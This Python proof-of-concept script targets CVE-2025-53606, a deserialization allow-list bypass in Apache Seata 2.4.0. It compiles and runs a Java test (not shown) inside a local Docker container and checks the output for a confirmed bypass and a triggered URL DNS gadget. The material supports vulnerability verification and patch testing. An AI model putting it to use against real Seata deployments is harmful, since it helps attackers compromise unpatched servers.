#!/usr/bin/env python3
# ---------------------------------------------------------------
# Exploit Title  : CVE-2025-53606 — Apache Seata Fury ClassChecker Bypass (Vector 2)
# Affected        : Apache Seata 2.4.0 (seata-serializer-fury)
# Patched         : Apache Seata 2.5.0
# Author          : Exploit Intelligence Platform (EIP)
# Website         : https://exploit-intel.com
# Twitter/X       : @exploit_intel
# CVSS            : 9.8 CRITICAL
# CWE             : CWE-502 — Deserialization of Untrusted Data
# ---------------------------------------------------------------
"""
PoC Vector 2 for CVE-2025-53606: Direct ClassChecker Bypass Verification

This PoC directly demonstrates the root cause of the vulnerability by
comparing the broken lambda ClassChecker (Seata 2.4.0) against the
fixed AllowListChecker (Seata 2.5.0) within the same JVM.

It proves:
1. Attacker generates payloads with unrestricted Fury (no ClassChecker)
2. Vulnerable server deserializes non-whitelisted classes (lambda returns
   false but Fury ignores the boolean return value in loadClass())
3. Patched server blocks non-whitelisted classes (AllowListChecker throws
   InsecureException which Fury properly handles)

Unlike poc.py (network-based), this test runs entirely inside the JVM,
isolating the vulnerability to the ClassChecker behavior.

Usage:
  python3 poc_vector2.py [container_name]
  python3 poc_vector2.py cve-2025-53606-vulnerable

Requires: Docker access to run Java code inside the Seata container
"""

import sys
import os
import subprocess

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


def run_local_test(container_name="cve-2025-53606-vulnerable"):
    """
    Run the ClassCheckerBypassTest Java program inside the Seata container.
    This directly tests the Fury ClassChecker behavior with the actual
    Fury library version (0.8.0) used by the server.
    """
    print("=" * 70)
    print("CVE-2025-53606: Direct ClassChecker Bypass Verification (Vector 2)")
    print("=" * 70)
    print(f"Container: {container_name}")
    print()

    # Step 1: Check container is running
    print("[*] Checking container status...")
    result = subprocess.run(
        ["docker", "inspect", container_name, "--format", "{{.State.Status}}"],
        capture_output=True, text=True, timeout=10
    )
    if result.returncode != 0 or "running" not in result.stdout:
        print(f"[-] Container {container_name} is not running")
        return False
    print(f"[+] Container is running")

    # Step 2: Copy Java test to container (if not already there)
    print("[*] Copying ClassCheckerBypassTest.java to container...")
    java_file = os.path.join(SCRIPT_DIR, "ClassCheckerBypassTest.java")
    result = subprocess.run(
        ["docker", "cp", java_file, f"{container_name}:/tmp/pocgen/"],
        capture_output=True, text=True, timeout=10
    )
    if result.returncode != 0:
        print(f"[-] Failed to copy file: {result.stderr}")
        return False

    # Step 3: Compile
    print("[*] Compiling ClassCheckerBypassTest.java...")
    result = subprocess.run(
        ["docker", "exec", container_name, "bash", "-c",
         "cd /tmp/pocgen && javac -cp '.:/seata-server/libs/*' ClassCheckerBypassTest.java"],
        capture_output=True, text=True, timeout=30
    )
    if result.returncode != 0:
        print(f"[-] Compilation failed: {result.stderr}")
        return False
    print("[+] Compiled successfully")

    # Step 4: Run the test
    print("[*] Running ClassChecker bypass test...\n")
    result = subprocess.run(
        ["docker", "exec", container_name, "bash", "-c",
         "cd /tmp/pocgen && java -cp '.:/seata-server/libs/*' ClassCheckerBypassTest"],
        capture_output=True, text=True, timeout=30
    )

    # Display output (filter out Fury log noise)
    output = result.stdout + result.stderr
    for line in output.split('\n'):
        # Skip Fury's internal logging for cleaner output
        if any(skip in line for skip in [
            'FuryBuilder:', 'Fury:160', 'CompileUnit:', 'JaninoUtils:',
            'ObjectStreamSerializer:'
        ]):
            continue
        if line.strip():
            print(line)

    # Analyze results
    bypass_confirmed = "BYPASSED" in output and "CVE-2025-53606 CONFIRMED" in output
    url_dns_works = "hashCode() was called = DNS triggered" in output

    print()
    if bypass_confirmed:
        print("[+] DIRECT VERIFICATION: CVE-2025-53606 CONFIRMED")
        if url_dns_works:
            print("[+] URL DNS gadget activated — HashMap.put() triggered URL.hashCode()")
            print("    hashCode changed from -1 to computed value, proving DNS would fire")
        return True
    else:
        print("[-] Could not confirm bypass")
        return False


if __name__ == '__main__':
    container = sys.argv[1] if len(sys.argv) > 1 else "cve-2025-53606-vulnerable"
    result = run_local_test(container)
    sys.exit(0 if result else 1)
